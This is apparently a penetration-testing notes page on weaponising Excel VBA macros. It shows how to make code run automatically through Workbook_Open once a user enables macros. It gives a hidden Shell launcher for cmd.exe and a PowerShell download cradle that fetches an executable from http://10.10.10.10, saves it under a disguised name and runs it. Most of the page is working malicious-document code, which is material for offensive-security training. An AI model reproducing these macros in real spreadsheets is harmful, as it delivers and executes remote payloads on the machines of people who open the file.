# Excel

To create a new macro, call it "mymacro" or any arbitrary name. When the VB editor opens, select "ThisWorkbook" under the excel objects section in the project tree view. Make sure "Workbook" is selected in the first dropdown list and "Open" in the second. Then paste in the code and save and exit. This will run once the "Enable" macros button has been clicked by the user.

## VBA Application Launcher

We can launch applications outside of VBA with the "Shell" function. The function takes two arguments, first, the application to launch, and second, the "WindowStyle" of the launched application. We can use the "vbHide" or "0" value to launch a hidden application. Note, the application may not open in a window, however, it is visible as a child process with any process viewer/explorer utility such as procexp/64 from sysinternals.

```vba
Private Sub Workbook_Open()
    Dim str As String
    str = "cmd.exe"
    Shell str, 0
End Sub
```

## VBA PowerShell Download Cradle and Code Execution

{% hint style="info" %}
VBA in excel has a "Wait" function, however, for some reason I was unable to get it to work. Example below:

`Application.Wait (Now + TimeValue("0:00:10"))`

`Note that this will suspend all other events until the delay period is complete.`
{% endhint %}

```vba
Private Sub Workbook_Open()
    macro1
End Sub

Sub macro1()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/winout64.exe', 'C:\Users\Offsec\Desktop\winsysx64.exe')"
    Shell str, 1
    Wait (10)
    Dim RetVal
    RetVal = Shell("C:\Users\Offsec\Desktop\winsysx64.exe", 1)
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```





